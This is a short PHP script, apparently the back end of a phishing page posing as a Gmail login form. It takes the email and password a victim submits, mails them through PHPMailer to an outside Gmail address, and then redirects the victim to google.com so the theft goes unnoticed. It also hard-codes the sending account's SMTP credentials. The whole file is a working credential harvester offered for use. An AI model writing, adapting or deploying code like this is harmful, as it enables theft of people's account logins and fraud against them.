<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP
        $mail->isSMTP();
        $mail->Host = 'smtp.gmail.com';
        $mail->SMTPAuth = true;
        $mail->Username = 'lupitasmit967@gmail.com'; // Tu correo
        $mail->Password = 'GSIPVA2014'; // Tu contraseña
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;

        // Configuración del correo
        $mail->setFrom('lupitasmit967@gmail.com', 'Formulario Gmail');
        $mail->addAddress('nocponer12@gmail.com'); // Receptor

        $mail->isHTML(true);
        $mail->Subject = 'Datos del formulario de inicio de sesión';
        $mail->Body = "
            <h3>Datos enviados desde el formulario:</h3>
            <p><strong>Correo:</strong> $email</p>
            <p><strong>Contraseña:</strong> $password</p>
        ";

        // Enviar correo
        $mail->send();

        // Redirección a la página de Google
        header("Location: https://www.google.com");
        exit;
    } catch (Exception $e) {
        echo "Error al enviar el correo: {$mail->ErrorInfo}";
    }
}
?>